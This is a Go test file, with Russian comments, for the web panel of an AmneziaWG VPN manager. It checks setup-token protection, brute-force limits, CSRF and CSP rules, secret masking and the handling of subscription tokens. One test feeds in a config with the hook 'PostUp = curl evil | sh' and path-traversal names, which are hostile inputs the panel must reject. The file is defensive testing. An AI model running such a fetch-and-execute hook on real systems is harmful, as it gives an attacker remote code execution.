package web

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/http/httptest"
	"net/netip"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"awg31/internal/auth"
	"awg31/internal/store"
	"awg31/internal/subsync"
	"awg31/internal/tunnel"
)

// Различимый приватный ключ: проверяем, что он нигде не всплывает в ответах API.
var (
	secretKey = base64.StdEncoding.EncodeToString(func() []byte {
		b := make([]byte, 32)
		for i := range b {
			b[i] = byte(i + 1)
		}
		return b
	}())
	pubKey = base64.StdEncoding.EncodeToString(make([]byte, 32))
)

func goodConf() string {
	return "[Interface]\nPrivateKey = " + secretKey + "\nAddress = 10.0.0.2/32\n\n[Peer]\nPublicKey = " + pubKey +
		"\nPresharedKey = " + secretKey + "\nAllowedIPs = 0.0.0.0/0\nEndpoint = 192.0.2.1:51820\n"
}

// fakeRunner — состояние awg/awg-quick в памяти.
type fakeRunner struct {
	mu        sync.Mutex
	up        map[string]bool
	handshake int64
}

func (f *fakeRunner) Run(_ context.Context, name string, args ...string) ([]byte, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.up == nil {
		f.up = map[string]bool{}
	}
	switch {
	case strings.HasSuffix(name, "awg-quick"):
		base := strings.TrimSuffix(args[1][strings.LastIndex(args[1], "/")+1:], ".conf")
		f.up[base] = args[0] == "up"
	case strings.HasSuffix(name, "awg") && args[1] == "interfaces":
		var names []string
		for n, u := range f.up {
			if u {
				names = append(names, n)
			}
		}
		return []byte(strings.Join(names, " ")), nil
	case strings.HasSuffix(name, "awg") && args[2] == "dump":
		return []byte("SECRETPRIV\tPUB\t51820\toff\n" + pubKey + "\tSECRETPSK\t192.0.2.1:51820\t0.0.0.0/0\t" +
			strconv.FormatInt(f.handshake, 10) + "\t100\t200\t25\n"), nil
	}
	return nil, nil
}

type env struct {
	t      *testing.T
	srv    *Server
	ts     *httptest.Server
	client *http.Client
	st     *store.Store
	run    *fakeRunner
	token  string
}

func newEnv(t *testing.T, mutate ...func(*Config)) *env {
	t.Helper()
	return newEnvOpts(t, tunnel.Options{RunDir: t.TempDir()}, mutate...)
}

func newEnvOpts(t *testing.T, topts tunnel.Options, mutate ...func(*Config)) *env {
	t.Helper()
	st, err := store.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	run := &fakeRunner{}
	tm := tunnel.New(run, topts)
	token, _ := auth.NewToken()
	cfg := Config{
		Store: st, Tunnels: tm,
		Subs:       &subsync.Service{Store: st, Tunnels: tm},
		Sessions:   auth.NewSessions(time.Hour, 16),
		Limiter:    auth.NewLimiter(5, time.Minute, time.Minute, 100),
		SetupToken: token,
	}
	for _, m := range mutate {
		m(&cfg)
	}
	s := New(cfg)
	ts := httptest.NewServer(s.Handler())
	t.Cleanup(ts.Close)
	jar, _ := cookiejar.New(nil)
	return &env{t: t, srv: s, ts: ts, client: &http.Client{Jar: jar}, st: st, run: run, token: token}
}

func (e *env) do(method, path string, body any, hdr map[string]string) (int, map[string]any, string) {
	e.t.Helper()
	var rdr io.Reader
	if body != nil {
		raw, _ := json.Marshal(body)
		rdr = bytes.NewReader(raw)
	}
	req, _ := http.NewRequest(method, e.ts.URL+path, rdr)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	resp, err := e.client.Do(req)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	var m map[string]any
	_ = json.Unmarshal(raw, &m)
	return resp.StatusCode, m, string(raw)
}

func (e *env) setup() {
	e.t.Helper()
	code, _, raw := e.do("POST", "/api/auth/setup", map[string]string{"setup_token": e.token, "user": "admin", "password": "correct horse battery"}, nil)
	if code != 200 {
		e.t.Fatalf("первичная настройка: %d %s", code, raw)
	}
}

// ---------- проблема №1: захват WebUI при первом запуске ----------

func TestSetupRequiresOneTimeToken(t *testing.T) {
	e := newEnv(t)
	body := map[string]string{"user": "attacker", "password": "attacker-password-1"}

	body["setup_token"] = ""
	if code, _, _ := e.do("POST", "/api/auth/setup", body, nil); code != http.StatusForbidden {
		t.Fatalf("без токена настройка должна быть запрещена, код %d", code)
	}
	body["setup_token"] = "0000"
	if code, _, _ := e.do("POST", "/api/auth/setup", body, nil); code != http.StatusForbidden {
		t.Fatalf("с неверным токеном настройка должна быть запрещена, код %d", code)
	}
	if e.st.Snapshot().Configured() {
		t.Fatal("пароль не должен быть задан без токена")
	}

	body["setup_token"] = e.token
	if code, _, raw := e.do("POST", "/api/auth/setup", body, nil); code != 200 {
		t.Fatalf("с верным токеном: %d %s", code, raw)
	}
	// токен одноразовый
	if code, _, _ := e.do("POST", "/api/auth/setup", body, nil); code != http.StatusConflict {
		t.Fatalf("повторная настройка должна давать 409, код %d", code)
	}
	if e.srv.SetupToken() != "" {
		t.Fatal("токен должен сбрасываться после использования")
	}
}

func TestSetupBruteForceIsLimited(t *testing.T) {
	e := newEnv(t)
	var last int
	for i := 0; i < 8; i++ {
		last, _, _ = e.do("POST", "/api/auth/setup", map[string]string{"setup_token": "guess", "user": "a", "password": "longenoughpass"}, nil)
	}
	if last != http.StatusTooManyRequests {
		t.Fatalf("перебор токена должен упираться в лимит, последний код %d", last)
	}
}

func TestSetupValidation(t *testing.T) {
	e := newEnv(t)
	for name, b := range map[string]map[string]string{
		"короткий пароль": {"setup_token": e.token, "user": "admin", "password": "short"},
		"плохое имя":      {"setup_token": e.token, "user": "ad min", "password": "long enough password"},
	} {
		if code, _, _ := e.do("POST", "/api/auth/setup", b, nil); code != http.StatusBadRequest {
			t.Errorf("%s: ожидался 400, получено %d", name, code)
		}
	}
	if e.st.Snapshot().Configured() {
		t.Fatal("после отказов пароль не должен быть задан")
	}
}

// ---------- аутентификация, сессии, перебор ----------

func TestAPIRequiresAuth(t *testing.T) {
	e := newEnv(t)
	for _, p := range []string{"/api/status"} {
		if code, _, _ := e.do("GET", p, nil, nil); code != http.StatusUnauthorized {
			t.Errorf("GET %s без входа: %d", p, code)
		}
	}
	for _, c := range []struct{ m, p string }{
		{"PUT", "/api/profiles/wg0"}, {"DELETE", "/api/profiles/wg0"}, {"POST", "/api/profiles/wg0/up"},
		{"POST", "/api/profiles/wg0/down"}, {"PUT", "/api/subscriptions/wg0"}, {"POST", "/api/subscriptions/wg0/sync"},
		{"POST", "/api/auth/password"},
	} {
		if code, _, _ := e.do(c.m, c.p, map[string]string{}, nil); code != http.StatusUnauthorized {
			t.Errorf("%s %s без входа: %d", c.m, c.p, code)
		}
	}
}

func TestLoginLogoutAndCookieFlags(t *testing.T) {
	e := newEnv(t)
	e.setup()
	e.do("POST", "/api/auth/logout", nil, nil)
	if code, _, _ := e.do("GET", "/api/status", nil, nil); code != http.StatusUnauthorized {
		t.Fatalf("после выхода доступ должен закрываться: %d", code)
	}
	if code, _, _ := e.do("POST", "/api/auth/login", map[string]string{"user": "admin", "password": "wrong password!"}, nil); code != http.StatusUnauthorized {
		t.Fatalf("неверный пароль: %d", code)
	}
	if code, _, _ := e.do("POST", "/api/auth/login", map[string]string{"user": "nobody", "password": "correct horse battery"}, nil); code != http.StatusUnauthorized {
		t.Fatalf("неверный логин: %d", code)
	}

	req, _ := http.NewRequest("POST", e.ts.URL+"/api/auth/login", strings.NewReader(`{"user":"admin","password":"correct horse battery"}`))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var cookie *http.Cookie
	for _, c := range resp.Cookies() {
		cookie = c
	}
	if cookie == nil || !cookie.HttpOnly || cookie.SameSite != http.SameSiteStrictMode || cookie.Path != "/" {
		t.Fatalf("cookie должна быть HttpOnly + SameSite=Strict: %+v", cookie)
	}
}

func TestSecureCookieAndHSTSWhenTLS(t *testing.T) {
	e := newEnv(t, func(c *Config) { c.TLS = true })
	req, _ := http.NewRequest("POST", e.ts.URL+"/api/auth/setup", strings.NewReader(`{"setup_token":"`+e.token+`","user":"admin","password":"correct horse battery"}`))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var cookie *http.Cookie
	for _, c := range resp.Cookies() {
		cookie = c
	}
	if cookie == nil || !cookie.Secure || !strings.HasPrefix(cookie.Name, "__Host-") {
		t.Fatalf("при TLS cookie должна быть Secure с префиксом __Host-: %+v", cookie)
	}
	if resp.Header.Get("Strict-Transport-Security") == "" {
		t.Fatal("при TLS ожидался HSTS")
	}
}

func TestLoginBruteForceBlocked(t *testing.T) {
	e := newEnv(t)
	e.setup()
	e.do("POST", "/api/auth/logout", nil, nil)
	var last int
	for i := 0; i < 6; i++ {
		last, _, _ = e.do("POST", "/api/auth/login", map[string]string{"user": "admin", "password": "wrong password!"}, nil)
	}
	if last != http.StatusTooManyRequests {
		t.Fatalf("после серии неудач ожидался 429, получено %d", last)
	}
	// даже верный пароль не проходит во время блокировки
	if code, _, _ := e.do("POST", "/api/auth/login", map[string]string{"user": "admin", "password": "correct horse battery"}, nil); code != http.StatusTooManyRequests {
		t.Fatalf("во время блокировки вход закрыт, получено %d", code)
	}
}

func TestPasswordChangeRevokesOtherSessions(t *testing.T) {
	e := newEnv(t)
	e.setup()
	// вторая сессия (например, украденная cookie)
	other := newClient(t, e)
	if code, _, raw := other.do("POST", "/api/auth/login", map[string]string{"user": "admin", "password": "correct horse battery"}, nil); code != 200 {
		t.Fatalf("вход второй сессии: %d %s", code, raw)
	}
	if code, _, _ := other.do("GET", "/api/status", nil, nil); code != 200 {
		t.Fatal("вторая сессия должна работать")
	}
	if code, _, raw := e.do("POST", "/api/auth/password", map[string]string{"current_password": "correct horse battery", "new_password": "another long password"}, nil); code != 200 {
		t.Fatalf("смена пароля: %d %s", code, raw)
	}
	if code, _, _ := other.do("GET", "/api/status", nil, nil); code != http.StatusUnauthorized {
		t.Fatalf("после смены пароля старые сессии должны завершаться: %d", code)
	}
	if code, _, _ := e.do("GET", "/api/status", nil, nil); code != 200 {
		t.Fatal("текущая сессия должна остаться действующей")
	}
}

func newClient(t *testing.T, e *env) *env {
	jar, _ := cookiejar.New(nil)
	c := *e
	c.client = &http.Client{Jar: jar}
	return &c
}

// ---------- CSRF, заголовки, раскрытие информации ----------

func TestCSRFProtection(t *testing.T) {
	e := newEnv(t)
	e.setup()
	body := map[string]string{"content": goodConf()}

	if code, _, _ := e.do("PUT", "/api/profiles/wg0", body, map[string]string{"Origin": "https://evil.example"}); code != http.StatusForbidden {
		t.Errorf("чужой Origin должен блокироваться: %d", code)
	}
	if code, _, _ := e.do("PUT", "/api/profiles/wg0", body, map[string]string{"Sec-Fetch-Site": "cross-site"}); code != http.StatusForbidden {
		t.Errorf("Sec-Fetch-Site=cross-site должен блокироваться: %d", code)
	}
	if code, _, _ := e.do("PUT", "/api/profiles/wg0", body, map[string]string{"Sec-Fetch-Site": "same-site"}); code != http.StatusForbidden {
		t.Errorf("Sec-Fetch-Site=same-site должен блокироваться: %d", code)
	}
	if code, _, _ := e.do("PUT", "/api/profiles/wg0", body, map[string]string{"Origin": e.ts.URL, "Sec-Fetch-Site": "same-origin"}); code != 200 {
		t.Errorf("запрос с того же origin должен проходить: %d", code)
	}

	req, _ := http.NewRequest("PUT", e.ts.URL+"/api/profiles/wg1", strings.NewReader("content=x"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := e.client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusUnsupportedMediaType {
		t.Errorf("форма вместо JSON должна отвергаться: %d", resp.StatusCode)
	}
}

func TestSecurityHeadersAndNoInfoLeakOnHealth(t *testing.T) {
	e := newEnv(t)
	resp, err := http.Get(e.ts.URL + "/healthz")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	if strings.TrimSpace(string(raw)) != `{"ok":true}` {
		t.Fatalf("/healthz не должен раскрывать детали, получено %q", raw)
	}
	csp := resp.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "script-src 'self'") || strings.Contains(csp, "unsafe-inline") || !strings.Contains(csp, "frame-ancestors 'none'") {
		t.Fatalf("CSP должна запрещать inline-скрипты: %q", csp)
	}
	if resp.Header.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatal("нет X-Content-Type-Options")
	}

	// UI отдаётся без inline-скриптов
	resp2, _ := http.Get(e.ts.URL + "/")
	page, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()
	if strings.Contains(string(page), "<script>") || strings.Contains(string(page), " onclick=") {
		t.Fatal("в HTML не должно быть inline-скриптов")
	}
	if resp3, _ := http.Get(e.ts.URL + "/nope"); resp3.StatusCode != 404 {
		t.Fatal("неизвестный путь должен давать 404")
	}
}

func TestAuthStatusLeaksNothingBeforeLogin(t *testing.T) {
	e := newEnv(t)
	_, m, raw := e.do("GET", "/api/auth/status", nil, nil)
	if m["authenticated"] != false || strings.Contains(raw, "version") {
		t.Fatalf("до входа статус не должен содержать лишнего: %s", raw)
	}
}

// ---------- профили, туннели, секреты ----------

func TestProfilesNeverExposeSecrets(t *testing.T) {
	e := newEnv(t)
	e.setup()
	if code, _, raw := e.do("PUT", "/api/profiles/wg0", map[string]string{"content": goodConf()}, nil); code != 200 {
		t.Fatalf("сохранение профиля: %d %s", code, raw)
	}
	if code, _, raw := e.do("POST", "/api/profiles/wg0/up", nil, nil); code != 200 {
		t.Fatalf("up: %d %s", code, raw)
	}
	code, m, raw := e.do("GET", "/api/status", nil, nil)
	if code != 200 {
		t.Fatal(code)
	}
	for _, secret := range []string{secretKey, "SECRETPRIV", "SECRETPSK", "PrivateKey", "PresharedKey"} {
		if strings.Contains(raw, secret) {
			t.Fatalf("в /api/status найден секрет %q:\n%s", secret, raw)
		}
	}
	profiles := m["profiles"].([]any)
	p := profiles[0].(map[string]any)
	if p["up"] != true || p["autostart"] != true {
		t.Fatalf("ожидался поднятый туннель с автозапуском: %+v", p)
	}
}

func TestProfileRejectsHooksAndTraversal(t *testing.T) {
	e := newEnv(t)
	e.setup()
	evil := strings.Replace(goodConf(), "Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nPostUp = curl evil | sh", 1)
	if code, _, _ := e.do("PUT", "/api/profiles/wg0", map[string]string{"content": evil}, nil); code != http.StatusBadRequest {
		t.Fatalf("профиль с хуком должен отвергаться: %d", code)
	}
	for _, name := range []string{"..%2Fevil", "a%20b", "toolongprofilename1"} {
		if code, _, _ := e.do("PUT", "/api/profiles/"+name, map[string]string{"content": goodConf()}, nil); code == 200 {
			t.Errorf("имя %q должно отвергаться", name)
		}
	}
	if names, _ := e.st.ListProfiles(); len(names) != 0 {
		t.Fatalf("отвергнутые профили не должны сохраняться: %v", names)
	}
}

func TestUpDownLifecycle(t *testing.T) {
	e := newEnv(t)
	e.setup()
	e.do("PUT", "/api/profiles/wg0", map[string]string{"content": goodConf()}, nil)
	if code, _, _ := e.do("POST", "/api/profiles/wg0/up", nil, nil); code != 200 {
		t.Fatalf("up: %d", code)
	}
	if code, _, _ := e.do("POST", "/api/profiles/wg0/up", nil, nil); code != http.StatusConflict {
		t.Fatalf("повторный up должен давать 409: %d", code)
	}
	if !e.st.Snapshot().Up["wg0"] {
		t.Fatal("состояние «поднят» должно сохраняться для автозапуска")
	}
	if code, _, _ := e.do("POST", "/api/profiles/wg0/down", nil, nil); code != 200 {
		t.Fatalf("down: %d", code)
	}
	if e.st.Snapshot().Up["wg0"] {
		t.Fatal("после down автозапуск должен сниматься")
	}
	if code, _, _ := e.do("POST", "/api/profiles/missing/up", nil, nil); code != http.StatusNotFound {
		t.Fatalf("несуществующий профиль: %d", code)
	}
	if code, _, _ := e.do("DELETE", "/api/profiles/wg0", nil, nil); code != 200 {
		t.Fatalf("delete: %d", code)
	}
}

// ---------- проблемы №2/№3: подписки только по HTTPS ----------

func TestSubscriptionRejectsHTTPByDefault(t *testing.T) {
	e := newEnv(t)
	e.setup()
	code, _, raw := e.do("PUT", "/api/subscriptions/wg0", map[string]any{"url": "http://vps.example:8443/sub/tok", "interval_min": 30}, nil)
	if code != http.StatusBadRequest || !strings.Contains(raw, "HTTP") {
		t.Fatalf("http:// должен отвергаться: %d %s", code, raw)
	}
	if code, _, _ := e.do("PUT", "/api/subscriptions/wg0", map[string]any{"url": "https://u:p@vps.example/sub"}, nil); code != http.StatusBadRequest {
		t.Fatalf("учётные данные в URL должны отвергаться: %d", code)
	}
	if code, _, _ := e.do("PUT", "/api/subscriptions/wg0", map[string]any{"url": "https://vps.example/sub", "pin_sha256": "zz"}, nil); code != http.StatusBadRequest {
		t.Fatalf("плохой отпечаток: %d", code)
	}
	if code, _, _ := e.do("PUT", "/api/subscriptions/wg0", map[string]any{"url": "https://vps.example/sub", "interval_min": 1}, nil); code != http.StatusBadRequest {
		t.Fatalf("слишком частый интервал: %d", code)
	}
}

func TestSubscriptionAllowedHTTPOnlyWithExplicitSwitch(t *testing.T) {
	e := newEnv(t, func(c *Config) { c.AllowHTTPSubs = true })
	e.setup()
	if code, _, raw := e.do("PUT", "/api/subscriptions/wg0", map[string]any{"url": "http://vps.example/sub"}, nil); code != 200 {
		t.Fatalf("при явном разрешении http допустим: %d %s", code, raw)
	}
}

func TestSubscriptionTokenNeverReturned(t *testing.T) {
	e := newEnv(t)
	e.setup()
	body := map[string]any{"url": "https://vps.example/sub", "token": "awg_tok_TOPSECRET", "pin_sha256": strings.Repeat("ab", 32), "interval_min": 60}
	if code, _, raw := e.do("PUT", "/api/subscriptions/wg0", body, nil); code != 200 {
		t.Fatalf("сохранение: %d %s", code, raw)
	}
	_, m, raw := e.do("GET", "/api/status", nil, nil)
	if strings.Contains(raw, "TOPSECRET") {
		t.Fatalf("токен подписки не должен возвращаться через API: %s", raw)
	}
	p := m["profiles"].([]any)[0].(map[string]any)
	sub := p["subscription"].(map[string]any)
	if sub["token_set"] != true || sub["pin_sha256"] == "" {
		t.Fatalf("ожидались token_set и отпечаток: %+v", sub)
	}
	// пустой токен в обновлении сохраняет прежний
	e.do("PUT", "/api/subscriptions/wg0", map[string]any{"url": "https://vps.example/sub", "interval_min": 60}, nil)
	if e.st.Snapshot().Subs["wg0"].Token != "awg_tok_TOPSECRET" {
		t.Fatal("пустое поле токена должно сохранять прежний токен")
	}
	e.do("PUT", "/api/subscriptions/wg0", map[string]any{"url": "https://vps.example/sub", "clear_token": true}, nil)
	if e.st.Snapshot().Subs["wg0"].Token != "" {
		t.Fatal("clear_token должен удалять токен")
	}
}

// У панели amneziawg31-installer токен подписки лежит прямо в ссылке
// (/sub/awg0/<токен>), поэтому весь URL — секрет и API его не отдаёт.
func TestSubscriptionURLTokenNeverReturned(t *testing.T) {
	const tok = "dGhpcy1pcy1hLXNlY3JldC10b2tlbi0xMjM0NTY3OA"
	url := "https://vps.example:8443/sub/awg0/" + tok
	e := newEnv(t)
	e.setup()
	pin := "sha256//" + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
	body := map[string]any{"url": url, "pin_sha256": pin, "interval_min": 30}
	if code, _, raw := e.do("PUT", "/api/subscriptions/awg0", body, nil); code != 200 {
		t.Fatalf("ссылка панели с пином sha256// должна приниматься: %d %s", code, raw)
	}
	_, m, raw := e.do("GET", "/api/status", nil, nil)
	if strings.Contains(raw, tok) {
		t.Fatalf("токен из ссылки не должен возвращаться через API: %s", raw)
	}
	sub := m["profiles"].([]any)[0].(map[string]any)["subscription"].(map[string]any)
	if got, _ := sub["url"].(string); !strings.HasPrefix(got, "https://vps.example:8443/sub/awg0/") || strings.Contains(got, tok[:8]) {
		t.Fatalf("ссылка должна быть замаскирована: %q", sub["url"])
	}
	// пустое поле ссылки при сохранении оставляет прежнюю, не показывая её
	if code, _, raw := e.do("PUT", "/api/subscriptions/awg0", map[string]any{"interval_min": 60}, nil); code != 200 {
		t.Fatalf("пустая ссылка при существующей подписке: %d %s", code, raw)
	}
	if e.st.Snapshot().Subs["awg0"].URL != url {
		t.Fatal("прежняя ссылка должна сохраниться")
	}
	// а для новой подписки ссылка обязательна
	if code, _, _ := e.do("PUT", "/api/subscriptions/new1", map[string]any{"interval_min": 60}, nil); code != http.StatusBadRequest {
		t.Fatalf("для новой подписки без ссылки ожидался 400, получено %d", code)
	}
}

func TestSubscriptionNoticeIsShown(t *testing.T) {
	e := newEnv(t)
	e.setup()
	e.do("PUT", "/api/subscriptions/wg0", map[string]any{"url": "https://vps.example/sub"}, nil)
	_ = e.st.Update(func(st *store.State) error {
		x := st.Subs["wg0"]
		x.LastNotice = "удалено строк-хуков: 2"
		st.Subs["wg0"] = x
		return nil
	})
	_, m, _ := e.do("GET", "/api/status", nil, nil)
	sub := m["profiles"].([]any)[0].(map[string]any)["subscription"].(map[string]any)
	if sub["notice"] != "удалено строк-хуков: 2" {
		t.Fatalf("замечание должно доходить до интерфейса: %+v", sub)
	}
}

// ---------- IP клиента и доверенные прокси ----------

func TestClientIPTrustedProxies(t *testing.T) {
	s := New(Config{TrustedProxies: []netip.Prefix{netip.MustParsePrefix("10.0.0.0/8")}})
	mk := func(remote, xff string) *http.Request {
		r := httptest.NewRequest("GET", "/", nil)
		r.RemoteAddr = remote + ":1234"
		if xff != "" {
			r.Header.Set("X-Forwarded-For", xff)
		}
		return r
	}
	if got := s.clientIP(mk("203.0.113.5", "1.2.3.4")); got != "203.0.113.5" {
		t.Errorf("XFF от недоверенного источника игнорируется, получено %s", got)
	}
	if got := s.clientIP(mk("10.0.0.1", "198.51.100.9")); got != "198.51.100.9" {
		t.Errorf("XFF от доверенного прокси: %s", got)
	}
	// подделка слева не помогает: читаем справа налево
	if got := s.clientIP(mk("10.0.0.1", "6.6.6.6, 198.51.100.9, 10.0.0.7")); got != "198.51.100.9" {
		t.Errorf("должен выбираться первый недоверенный справа: %s", got)
	}
	if got := s.clientIP(mk("10.0.0.1", "")); got != "10.0.0.1" {
		t.Errorf("без XFF — адрес прокси: %s", got)
	}
}

// ---------- проба для netwatch ----------

func TestHealthHandler(t *testing.T) {
	run := &fakeRunner{}
	tm := tunnel.New(run, tunnel.Options{RunDir: t.TempDir()})
	get := func(max time.Duration) (int, string) {
		rec := httptest.NewRecorder()
		HealthHandler(tm, max).ServeHTTP(rec, httptest.NewRequest("GET", "/", nil))
		return rec.Code, rec.Body.String()
	}
	if code, body := get(0); code != 503 || body != "" {
		t.Fatalf("без туннелей: %d %q", code, body)
	}
	if err := tm.Up(context.Background(), "wg0", goodConf()); err != nil {
		t.Fatal(err)
	}
	if code, body := get(0); code != 200 || body != "" {
		t.Fatalf("с туннелем: %d %q (тело должно быть пустым)", code, body)
	}
	if code, _ := get(time.Minute); code != 503 {
		t.Fatalf("без рукопожатия при включённой проверке ожидался 503: %d", code)
	}
	run.mu.Lock()
	run.handshake = time.Now().Unix() - 5
	run.mu.Unlock()
	if code, _ := get(time.Minute); code != 200 {
		t.Fatalf("свежее рукопожатие: %d", code)
	}
	run.mu.Lock()
	run.handshake = time.Now().Unix() - 3600
	run.mu.Unlock()
	if code, _ := get(time.Minute); code != 503 {
		t.Fatalf("устаревшее рукопожатие: %d", code)
	}
}

func TestRejectsUnknownFieldsAndTrailingData(t *testing.T) {
	e := newEnv(t)
	e.setup()
	if code, _, _ := e.do("PUT", "/api/profiles/wg0", map[string]any{"content": goodConf(), "extra": 1}, nil); code != http.StatusBadRequest {
		t.Fatalf("неизвестное поле: %d", code)
	}
	req, _ := http.NewRequest("PUT", e.ts.URL+"/api/profiles/wg0", strings.NewReader(`{"content":"x"} {"content":"y"}`))
	req.Header.Set("Content-Type", "application/json")
	resp, _ := e.client.Do(req)
	resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("лишние данные после JSON: %d", resp.StatusCode)
	}
}

// Регрессия из дымового запуска: http.FileServer отвечает 301 на любой путь,
// оканчивающийся на /index.html, поэтому «/», переписанный в /index.html,
// уходил в бесконечный редирект и интерфейс не открывался.
func TestRootServesUIWithoutRedirect(t *testing.T) {
	e := newEnv(t)
	client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	for _, tc := range []struct{ path, ctype, marker string }{
		{"/", "text/html", `<script src="/app.js">`},
		{"/app.js", "text/javascript", "fetch"},
		{"/app.css", "text/css", "{"},
		{"/services.js", "text/javascript", "AWG_SERVICES"},
		{"/services.css", "text/css", "--svc"},
		{"/rules.js", "text/javascript", "AWG_RULES"},
	} {
		resp, err := client.Get(e.ts.URL + tc.path)
		if err != nil {
			t.Fatal(err)
		}
		raw, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("%s: код %d, Location=%q", tc.path, resp.StatusCode, resp.Header.Get("Location"))
		}
		if ct := resp.Header.Get("Content-Type"); !strings.HasPrefix(ct, tc.ctype) {
			t.Fatalf("%s: Content-Type %q", tc.path, ct)
		}
		if !strings.Contains(string(raw), tc.marker) {
			t.Fatalf("%s: в теле нет %q", tc.path, tc.marker)
		}
	}
}

func TestStaticAssetsFontsAndNoDirectoryListing(t *testing.T) {
	e := newEnv(t)
	client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	get := func(path string) (*http.Response, string) {
		resp, err := client.Get(e.ts.URL + path)
		if err != nil {
			t.Fatal(err)
		}
		raw, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		return resp, string(raw)
	}
	for _, f := range []string{"exo-2-latin-wght-normal.woff2", "exo-2-cyrillic-wght-normal.woff2",
		"jetbrains-mono-latin-wght-normal.woff2", "jetbrains-mono-cyrillic-wght-normal.woff2"} {
		resp, body := get("/fonts/" + f)
		if resp.StatusCode != 200 || len(body) < 5000 {
			t.Fatalf("шрифт %s не отдаётся: %d, %d байт", f, resp.StatusCode, len(body))
		}
		if !strings.Contains(resp.Header.Get("Cache-Control"), "max-age") {
			t.Fatalf("шрифт должен кэшироваться: %q", resp.Header.Get("Cache-Control"))
		}
	}
	if resp, _ := get("/fonts/"); resp.StatusCode == 200 {
		t.Fatal("каталог шрифтов не должен листаться")
	}
	if resp, _ := get("/fonts/../server.go"); resp.StatusCode == 200 {
		t.Fatal("выход из каталога статики недопустим")
	}
	if resp, _ := get("/icon.svg"); resp.StatusCode != 200 {
		t.Fatalf("иконка: %d", resp.StatusCode)
	}
	_, css := get("/app.css")
	for _, f := range []string{"/fonts/exo-2-latin-wght-normal.woff2", "/fonts/jetbrains-mono-cyrillic-wght-normal.woff2"} {
		if !strings.Contains(css, f) {
			t.Fatalf("app.css не ссылается на %s", f)
		}
	}
	resp, _ := get("/")
	csp := resp.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "font-src 'self'") || strings.Contains(csp, "unsafe-inline") || strings.Contains(csp, "unsafe-eval") {
		t.Fatalf("CSP должен разрешать шрифты только со своего origin и без unsafe-*: %s", csp)
	}
}

// В стилях и скриптах не должно быть того, что нарушает строгий CSP.
func TestStaticCodeIsCSPClean(t *testing.T) {
	for _, name := range []string{"static/app.js", "static/index.html", "static/app.css", "static/services.js", "static/services.css", "static/rules.js"} {
		raw, err := staticFS.ReadFile(name)
		if err != nil {
			t.Fatal(err)
		}
		// xmlns — идентификатор пространства имён SVG, а не адрес для загрузки.
		s := strings.ReplaceAll(string(raw), "http://www.w3.org/2000/svg", "")
		for _, bad := range []string{"innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "new Function", "javascript:", "style=\"", "https://", "http://"} {
			if strings.Contains(s, bad) && !(bad == "https://" && name == "static/app.js") {
				t.Errorf("%s содержит %q", name, bad)
			}
		}
		// Атрибуты, которые h() выставляет из объекта, и прямые правки стиля тоже
		// блокируются CSP (style-src 'self'): оформление — только классами в app.css.
		if name == "static/app.js" {
			for _, bad := range []string{" style:", "{style:", ".style.", ".style[", "setAttribute(\"style\"", "cssText"} {
				if strings.Contains(s, bad) {
					t.Errorf("%s содержит %q: inline-стили запрещены CSP", name, bad)
				}
			}
		}
	}
}

// Всё, что index.html подключает по абсолютному пути, должно отдаваться: новый файл в static/
// без маршрута в Handler даёт 404 с text/plain, и браузер молча не исполняет скрипт.
func TestIndexAssetsAreServed(t *testing.T) {
	e := newEnv(t)
	idx, err := staticFS.ReadFile("static/index.html")
	if err != nil {
		t.Fatal(err)
	}
	refs := regexp.MustCompile(`(?:src|href)="(/[^"]+)"`).FindAllStringSubmatch(string(idx), -1)
	if len(refs) < 4 {
		t.Fatalf("в index.html нашлось только %d ссылок", len(refs))
	}
	for _, m := range refs {
		resp, err := http.Get(e.ts.URL + m[1])
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("%s из index.html: код %d", m[1], resp.StatusCode)
		}
	}
}

// При входе поле логина должно быть пустым: администратор мог выбрать любое имя, а
// подставленное «admin» заставляет стирать его перед каждым входом.
func TestLoginUserFieldIsNotPrefilled(t *testing.T) {
	raw, err := staticFS.ReadFile("static/app.js")
	if err != nil {
		t.Fatal(err)
	}
	var line string
	for _, l := range strings.Split(string(raw), "\n") {
		if strings.Contains(l, `id: "au-user"`) {
			line = l
		}
	}
	if line == "" {
		t.Fatal("поле au-user не найдено")
	}
	if strings.Contains(line, `value: "admin"`) || !strings.Contains(line, `value: setup ? "admin" : ""`) {
		t.Fatalf("при входе поле логина должно быть пустым, «admin» только при первичной настройке: %s", strings.TrimSpace(line))
	}
}
